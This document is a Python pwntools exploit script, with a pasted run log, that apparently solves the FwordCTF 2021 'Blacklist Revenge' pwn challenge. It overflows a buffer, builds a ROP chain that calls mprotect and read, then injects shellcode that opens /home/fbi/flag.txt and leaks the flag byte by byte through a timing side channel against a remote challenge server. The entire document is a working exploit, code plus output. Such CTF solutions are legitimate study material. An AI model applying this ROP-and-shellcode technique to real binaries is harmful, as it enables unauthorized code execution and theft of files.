from pwn import *
import time

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './blacklist'
elf  = ELF(BINARY)

pop_rax_ret = 0x414e53 # pop rax; ret;
add_rax_ret = 0x47fb40 # add rax, 3; ret; 
pop_rdi_ret = 0x4018ca # pop rdi; ret;
pop_rsi_ret = 0x4028b8 # pop rsi; ret; 
pop_rdx_ret = 0x4017cf # pop rdx; ret; 
syscall_ret = 0x426094 # syscall; ret;

flag = "FwordCTF{you_"
a = "1234567890_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-!"

for j in range(len(flag), 0x60):
  for i in a:
    print j, i, flag
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
      HOST = "40.71.72.198"
      PORT = 1236
      s = remote(HOST, PORT)
    else:
      s = process(BINARY)

    buf  = "A"*72
    # mprotect(0x4dd000, 0x3000, 7)
    buf += p64(pop_rax_ret)
    buf += p64(7)  
    buf += p64(add_rax_ret) # 7+3=10  sys_mprotect
    buf += p64(pop_rdi_ret)
    buf += p64(0x4df000)
    buf += p64(pop_rsi_ret)
    buf += p64(0x1000)
    buf += p64(pop_rdx_ret)
    buf += p64(7)
    buf += p64(syscall_ret)
    # read(0, 0x4e0a00, 0x100)
    buf += p64(pop_rax_ret)
    buf += p64(0) 
    buf += p64(pop_rdi_ret)
    buf += p64(0)
    buf += p64(pop_rsi_ret)
    buf += p64(0x4dfb00)
    buf += p64(pop_rdx_ret)
    buf += p64(0x100)
    buf += p64(syscall_ret)
    buf += p64(0x4dfb00)
    s.sendline(buf)

    sleep(0.1)

    buf = asm('''
      /* openat(0, "/home/fbi/flag.txt", 0, 0) */
      push 257
      pop  rax
      push 0
      pop  rdi
      push 0x4dfb80
      pop  rsi
      push 0
      pop  rdx
      push 0
      pop  r10
      syscall
      /* read(3, 0x4dfba0, 0x60) */
      push rax
      pop  rdi
      push 0
      pop rax
      push 0x4dfba0
      pop  rsi
      push 0x60
      pop  rdx
      syscall
      push ''' + str(j) + '''
      pop  rcx
      mov  al, byte ptr[rsi+rcx]
      cmp  al, ''' + str(ord(i)) + '''
    loop:
      je   loop  
    ''')
    buf += "\x90"*(0x80 - len(buf))
    buf += "/home/fbi/flag.txt\x00"
    #pause()
    t0 = time.time()
    s.sendline(buf)
 
    s.recvrepeat(2) 
    t1 = time.time() - t0
    print t1
    if t1 > 2:
      flag += i
      print "************** HIT ! **************"
      print i, flag
      s.close()
      break
    s.close() 
 
s.interactive()

'''
mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge$ python solve.py r
[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
13 1 FwordCTF{you_
...
53 _ FwordCTF{you_aRe_aw3s0Me_!_you_d1d_i7_again_th1s_Ye4r
[+] Opening connection to 40.71.72.198 on port 1236: Done
0.453144073486
[*] Closed connection to 40.71.72.198 port 1236
53 { FwordCTF{you_aRe_aw3s0Me_!_you_d1d_i7_again_th1s_Ye4r
[+] Opening connection to 40.71.72.198 on port 1236: Done
0.490801095963
[*] Closed connection to 40.71.72.198 port 1236
53 } FwordCTF{you_aRe_aw3s0Me_!_you_d1d_i7_again_th1s_Ye4r
[+] Opening connection to 40.71.72.198 on port 1236: Done
2.00382494926
************** HIT ! **************
'''
